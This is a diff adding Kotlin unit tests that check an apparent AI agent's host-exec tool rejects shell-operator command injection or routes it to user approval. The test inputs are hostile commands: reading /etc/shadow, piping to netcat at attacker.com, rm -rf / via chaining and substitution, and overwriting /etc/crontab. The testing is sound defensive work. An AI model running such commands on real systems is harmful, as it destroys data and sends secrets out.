@@ -310,4 +310,111 @@ class HostExecToolTest {
             val result = t.execute("any-command", "chat_1")
             assertTrue(result.contains("disabled"), "Should report disabled: $result")
         }
+
+    // --- Command injection rejection tests (issue #23) ---
+
+    @Test
+    fun `allowList rejects command with semicolon injection`() =
+        runTest {
+            val t = tool(config(allowList = listOf("ls *")))
+            val result = t.execute("ls -la ; cat /etc/shadow", "chat_1")
+            assertTrue(result.contains("shell operators"), "Should reject: $result")
+        }
+
+    @Test
+    fun `allowList rejects command with pipe injection`() =
+        runTest {
+            val t = tool(config(allowList = listOf("ls *")))
+            val result = t.execute("ls /tmp | nc attacker.com 4444", "chat_1")
+            assertTrue(result.contains("shell operators"), "Should reject: $result")
+        }
+
+    @Test
+    fun `allowList rejects command with AND chaining`() =
+        runTest {
+            val t = tool(config(allowList = listOf("echo *")))
+            val result = t.execute("echo hello && rm -rf /", "chat_1")
+            assertTrue(result.contains("shell operators"), "Should reject: $result")
+        }
+
+    @Test
+    fun `allowList rejects command with backtick substitution`() =
+        runTest {
+            val t = tool(config(allowList = listOf("ls *")))
+            val result = t.execute("ls `rm -rf /`", "chat_1")
+            assertTrue(result.contains("shell operators"), "Should reject: $result")
+        }
+
+    @Test
+    fun `allowList rejects command with dollar substitution`() =
+        runTest {
+            val t = tool(config(allowList = listOf("ls *")))
+            val result = t.execute("ls \$(rm -rf /)", "chat_1")
+            assertTrue(result.contains("shell operators"), "Should reject: $result")
+        }
+
+    @Test
+    fun `allowList rejects command with redirect`() =
+        runTest {
+            val t = tool(config(allowList = listOf("echo *")))
+            val result = t.execute("echo pwned > /etc/crontab", "chat_1")
+            assertTrue(result.contains("shell operators"), "Should reject: $result")
+        }
+
+    @Test
+    fun `notifyList rejects command with injection and does not notify`() =
+        runTest {
+            val t = tool(config(notifyList = listOf("docker restart *")))
+            val result = t.execute("docker restart foo && rm -rf /", "chat_1")
+            assertTrue(result.contains("shell operators"), "Should reject: $result")
+            assertTrue(sentMessages.isEmpty(), "Should NOT send notification for rejected command")
+        }
+
+    @Test
+    fun `LLM pre-validation rejects command with shell operators even if low risk`() =
+        runTest {
+            val t =
+                tool(
+                    config(
+                        preValidation = PreValidationConfig(enabled = true, model = "test/haiku", riskThreshold = 5),
+                    ),
+                    llmRouter = fakeLlmRouter(riskScore = 1),
+                )
+            val result = t.execute("cat /var/log/syslog ; rm -rf /", "chat_1")
+            assertTrue(result.contains("shell operators"), "Should reject: $result")
+        }
+
+    @Test
+    fun `command with operators not in any list goes to approval not rejection`() =
+        runTest {
+            val approval = ApprovalService(sender)
+            val t =
+                HostExecTool(
+                    config(preValidation = PreValidationConfig(enabled = false)),
+                    fakeLlmRouter(),
+                    approval,
+                )
+
+            val result = async { t.execute("ls ; rm -rf /", "chat_1") }
+            delay(50)
+
+            // Should send approval request, NOT reject with "shell operators"
+            val approvalMsgs =
+                sentMessages.filterIsInstance<io.github.klaw.common.protocol.ApprovalRequestMessage>()
+            assertTrue(approvalMsgs.isNotEmpty(), "Should ask user for approval, not auto-reject")
+
+            approval.handleResponse(ApprovalResponseMessage(approvalMsgs.first().id, approved = false))
+            val output = result.await()
+            assertTrue(output.contains("rejected"), "Should be rejected by user: $output")
+            assertFalse(output.contains("shell operators"), "Should NOT be auto-rejected: $output")
+        }
+
+    @Test
+    fun `safe command in allowList still executes`() =
+        runTest {
+            val t = tool(config(allowList = listOf("df -h", "free -m")))
+            val result = t.execute("df -h", "chat_1")
+            assertFalse(result.contains("shell operators"), "Safe command should execute: $result")
+            assertFalse(result.contains("rejected"), "Safe command should not be rejected: $result")
+        }
 }
